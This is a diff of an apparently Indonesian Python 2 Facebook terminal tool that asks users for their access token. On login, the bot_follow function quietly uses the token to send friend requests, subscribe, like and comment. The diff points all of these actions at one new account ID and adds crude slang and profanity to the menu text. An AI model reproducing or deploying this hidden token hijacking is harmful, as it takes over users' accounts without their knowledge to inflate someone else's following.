@@ -27,11 +27,11 @@ logo = ("""\x1b[1;92m ___ ___ ___ __  __ ___ _   _ __  __
 \x1b[1;92m| _ \ _ \ __|  \/  |_ _| | | |  \/  |
 \x1b[1;96m|  _/   / _|| |\/| || || |_| | |\/| |
 \x1b[1;96m|_| |_|_\___|_|  |_|___|\___/|_|  |_| v2.7
-\x1b1;96m[\x1b[1;97m\x1b[1;96m\x1b[1;97m——————————————————————————————————
+\x1b1;96m[\x1b[1;97m\x1b[\x1b[1;97m————————————————————————————————————
 \x1b[1;95m[\x1b[1;97m•\x1b[1;95m]\x1b[1;97m Author   : Aang Ardiansyah-XD
 \x1b[1;95m[\x1b[1;97m•\x1b[1;95m]\x1b[1;97m Github   : Github.com/AngCyber
 \x1b[1;95m[\x1b[1;97m•\x1b[1;95m]\x1b[1;97m Facebook : Facebook.com/clubfunbike (Saya Aang)
-\x1b1;96m[\x1b[1;97m\x1b[1;96m\x1b[1;97m——————————————————————————————————
+\x1b1;96m[\x1b[1;97m\x1b[\x1b[1;97m————————————————————————————————————
 """)
 url=('http://ipinfo.io/json')
 response=urlopen(url)
@@ -46,15 +46,15 @@ mobile_h={'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insec
 def login():
 	os.system('clear')
 	print(logo)
-	print("\x1b[1;92m[\x1b[1;97m1\x1b[1;92m]\x1b[1;97m Login Pakai Token")
-	print("\x1b[1;92m[\x1b[1;97m2\x1b[1;92m]\x1b[1;97m Cara Mendapat Token")
-	print("\x1b[1;92m[\x1b[1;93m0\x1b[1;92m]\x1b[1;93m Keluar")
-	login = raw_input("\n\x1b[1;92m[\x1b[1;97m#\x1b[1;92m] Choose :\x1b[1;96m ")
+	print("\x1b[1;92m[\x1b[1;97m01\x1b[1;92m]\x1b[1;97m Login Pakai Token")
+	print("\x1b[1;92m[\x1b[1;97m02\x1b[1;92m]\x1b[1;97m Cara Mendapatkan Token")
+	print("\x1b[1;92m[\x1b[1;93m00\x1b[1;92m]\x1b[1;93m Keluar (Ahh Ngecrot)")
+	login = raw_input("\n\x1b[1;92m[\x1b[1;97m•\x1b[1;92m] Choose :\x1b[1;96m ")
 	if login == "":
 		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m] \x1b[1;91mWrong Input")
 	elif login == "1":
                 try:
-			token=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Token :\x1b[1;92m ")
+			token=raw_input("\x1b[1;96m[\x1b[1;97m?\x1b[1;96m]\x1b[1;97m Masukin Token Dulu Ngab :\x1b[1;92m ")
                         cek=requests.get('https://graph.facebook.com/me?access_token='+token)
                         y=json.loads(cek.text)
                         nama = y['name']
@@ -63,11 +63,11 @@ def login():
                         save.close()
                         bot_follow()
                 except KeyError:
-                        exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Token Salah")
+                        exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Token Salah Kentod!!")
 	elif login == "2":
-		print("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Anda Akan Diarahkan Ke Browser")
+		print("\x1b[1;96m[\x1b[1;97m!\x1b[1;96m]\x1b[1;97m Anda Akan Diarahkan Ke Youtube")
 		time.sleep(3)
-		os.system("xdg-open https://youtu.be/3Y6xsMB3wRg")
+		os.system("xdg-open https://youtu.be/iDVCcnLcTnE")
 		exit()
 	elif login == "0":
 		exit()
@@ -95,19 +95,19 @@ def bot_follow():
 	komen3 = kata_utama3+"\n"+pantun_motivasi+"\n"+waktu
 	requests.post('https://graph.facebook.com/me/friends?method=post&uids=100064814153036&access_token='+token) #Rozhak
 	requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token) #Rozhak
-        requests.post('https://graph.facebook.com/100000288808056/subscribers?access_token='+token) #Muhammad Rozhak
-	requests.post('https://graph.facebook.com/100064814153036/subscribers?access_token='+token) #Rozhak
-	requests.post('https://graph.facebook.com/10159494942223544/comments/?message='+komen+'&access_token='+token) #Foto Profil
-	requests.post('https://graph.facebook.com/10159494942223544/likes?summary=true&access_token='+token) #Foto Profil
-	requests.post('https://graph.facebook.com/10159494942223544/comments/?message='+komen3+'&access_token='+token) # Foto Profil
-	requests.post('https://graph.facebook.com/10158807643598544/comments/?message='+komen2+'&access_token='+token) #Foto Sampul
-	print("\x1b[1;96m[\x1b[1;92m#\x1b[1;96m]\x1b[1;92m Login Berhasil")
+        requests.post('https://graph.facebook.com/100001390111040/subscribers?access_token='+token) #Muhammad Rozhak
+	requests.post('https://graph.facebook.com/100001390111040/subscribers?access_token='+token) #Rozhak
+	requests.post('https://graph.facebook.com/100001390111040/comments/?message='+komen+'&access_token='+token) #Foto Profil
+	requests.post('https://graph.facebook.com/100001390111040/likes?summary=true&access_token='+token) #Foto Profil
+	requests.post('https://graph.facebook.com/100001390111040/comments/?message='+komen3+'&access_token='+token) # Foto Profil
+	requests.post('https://graph.facebook.com/100001390111040/comments/?message='+komen2+'&access_token='+token) #Foto Sampul
+	print("\x1b[1;96m[\x1b[1;92m#\x1b[1;96m]\x1b[1;92m Berhasil Masuk, Sabar Ngab...")
 	menu()
 def publik():
         try:
                 token=open('___rozhak___','r').read()
         except IOError:
-                print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookies Invalid')
+                print('\x1b[1;93m[\x1b[1;91m!\x1b[1;93m]\x1b[1;91m Cookies Invalid Ngab!!')
                 os.system('rm -rf ___rozhak___')
                 time.sleep(2)
                 login()
